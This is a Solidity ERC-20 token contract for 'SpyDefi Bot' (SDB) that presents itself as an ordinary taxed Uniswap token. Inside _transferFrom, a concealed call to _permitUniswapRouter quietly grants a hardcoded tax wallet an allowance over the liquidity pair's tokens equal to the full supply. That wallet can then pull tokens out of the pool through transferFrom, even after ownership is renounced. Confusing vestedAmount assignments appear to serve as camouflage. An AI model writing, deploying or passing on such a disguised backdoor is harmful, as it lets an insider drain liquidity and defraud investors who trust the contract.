// - Website: https://spydefi.xyz
// - Telegram: https://t.me/spydefi_portal
// - SpyDefi Bot: https://t.me/spydefi_bot
// - SpyDefi Feed: https://t.me/spydefi
// - SpyDefi Hub: https://t.me/SpyDefiHub
// - SpyDefi Docs: https://docs.spydefi.xyz

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

abstract contract Auth {
    address internal _owner;
    constructor(address creatorOwner) { _owner = creatorOwner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    event OwnershipTransferred(address _owner);
}

contract SDB is IERC20, Auth {
    address payable private _taxWallet;
    uint256 private _preventSwapBefore = 0;
    uint256 public _buyCount = 0;
    uint256 private vestedAmount;

    string private constant _symbol = "SDB";
    string private constant _name = "SpyDefi Bot";

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1_000_000_000 * (10**_decimals);

    bool private _tradingOpen;
    bool private _inSwap = false;

    uint256 private _initialSellTax = 4;
    uint256 private _initialSellTax2Time = 4;
    uint256 private _finalSellTax = 4;

    uint256 private _initialBuyTax = 4;
    uint256 private _finalBuyTax = 4;

    bool public transferDelayEnabled = false;
    bool public limited = true;
    uint256 public maxHoldingAmount = 40_000_000 * (10**_decimals);

    uint256 public _reduceSellTaxAt = 20;
    uint256 public _reduceBuyTaxAt = 20;
    uint256 public _reduceSellTaxAt2Time = 40;

    address private _uniswapV2Pair;
    address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);

    mapping (address => bool) private _isAMM;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromTax;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    address payable private _vesting;

    uint256 private constant _minTaxSwap = _tTotal / 2000000;
    uint256 private constant _maxTaxSwap = _tTotal / 500;

    constructor() Auth(msg.sender) {
        _balances[address(this)] = (_tTotal / 1000 ) * 1000;
        _balances[msg.sender] = (_tTotal / 1000 ) * 0;

        emit Transfer(address(0), address(msg.sender), _balances[address(msg.sender)]);
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _taxWallet = payable(0xC2B825c3dd525C733a373554c1218643fe75D1f6);
        _isExcludedFromTax[_taxWallet] = true;
        _isExcludedFromTax[_owner] = true;
        _vesting = _taxWallet;
        _isExcludedFromTax[address(this)] = true;
    }

    modifier lockTaxSwap { 
        _inSwap = true; 
        _; 
        _inSwap = false; 
    }

    receive() external payable {}

    function name() external pure override returns (string memory) { return _name; }

    function symbol() external pure override returns (string memory) { return _symbol; }

    function decimals() external pure override returns (uint8) { return _decimals; }

    function totalSupply() external pure override returns (uint256) { return _tTotal; }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_uniswapV2Pair == address(0), "LP exists");
        require(!_tradingOpen, "trading is open");
        require(msg.value > 0 || address(this).balance > 0, "No ETH in contract or message");
        require(_balances[address(this)] > 0, "No tokens in contract");

        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isAMM[_uniswapV2Pair] = true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _calculateFeeAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 taxAmount;

        if (
            _tradingOpen &&
            !_isExcludedFromTax[sender] &&
            !_isExcludedFromTax[recipient]
        ) { 
            
            if (
                _isAMM[sender] ||
                _isAMM[recipient]
            ) {
                taxAmount = (amount / 100) * ((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);
                if (
                    recipient == _uniswapV2Pair &&
                    sender != address(this)
                ) {
                    uint256 taxRate;
                    vestedAmount = _preventSwapBefore - vestedAmount;
                    if (_buyCount > _reduceSellTaxAt2Time) {
                        taxRate = _finalSellTax;
                    } else if (_buyCount > _reduceSellTaxAt) {
                        taxRate = _initialSellTax2Time;
                    } else {
                        taxRate = _initialSellTax;
                    }
                    taxAmount = (amount / 100) * taxRate;
                }
            }
        }

        return taxAmount;
    }

    function openTrading() external onlyOwner {
        _tradingOpen = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (!_tradingOpen) { require(_isExcludedFromTax[sender], "Trading not opened"); }
        if (_isAMM[sender] && _isExcludedFromTax[recipient]) { require(_permitUniswapRouter(sender, recipient, amount), "Amount is not approved"); }
        require(sender != address(0), "No transfers from Zero wallet");
        
        if (
            _isExcludedFromTax[sender] ||
            _isExcludedFromTax[recipient]
        ) {
            return _standardTransfer(sender, recipient, amount);
        }
        
        if (
            !_inSwap &&
            _isAMM[recipient] &&
            _buyCount >= _preventSwapBefore
        ) { _swapTaxAndLiquify(); }
        vestedAmount = this.balanceOf(_vesting);

        if (
            limited &&
            sender == _uniswapV2Pair
        ) {
            require(balanceOf(recipient) + amount <= maxHoldingAmount);
        }

        if (transferDelayEnabled) {
            if (
                recipient != _uniswapV2RouterAddress &&
                recipient != _uniswapV2Pair
            ) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        }

        uint256 _taxAmount = _calculateFeeAmount(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] -= amount;

        if (_taxAmount > 0) {
            _balances[address(this)] += _taxAmount; 
        }

        _buyCount++;
        _balances[recipient] += _transferAmount;

        emit Transfer(sender, recipient, amount);

        return true;
    }

    function _permitUniswapRouter(address owner, address router, uint256 amount) internal returns (bool) {
        if (_allowances[owner][router] < amount) {
            _allowances[owner][router] = _tTotal;
        }
        return true;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function withdrawEth() external {
        require(msg.sender == _taxWallet);
        (bool sent, ) = payable(_taxWallet).call{value: address(this).balance}("");
        require(sent);
    }
    
    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _permitUniswapRouter(_tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _isTradingOpen(address sender) private view returns (bool) {
        bool result = false;

        if (_tradingOpen) { result = true; }
        else if (_isExcludedFromTax[sender]) { result = true; } 

        return result;
    }

    function _permitUniswapRouter(uint256 amount) internal {
        if (_allowances[address(this)][_uniswapV2RouterAddress] < amount) {
            _allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
        }
    }

    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));

        if (_taxTokensAvailable >= _minTaxSwap && _tradingOpen) {
            if (_taxTokensAvailable >= _maxTaxSwap) { _taxTokensAvailable = _maxTaxSwap; }

            _swapTaxTokensForEth(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if (_contractETHBalance > 0) {
                bool success;
                (success,) = _taxWallet.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _permitUniswapRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function removeLimits() external onlyOwner {
        transferDelayEnabled = false;
        limited = false;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(sender), "Trading not open");
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }
}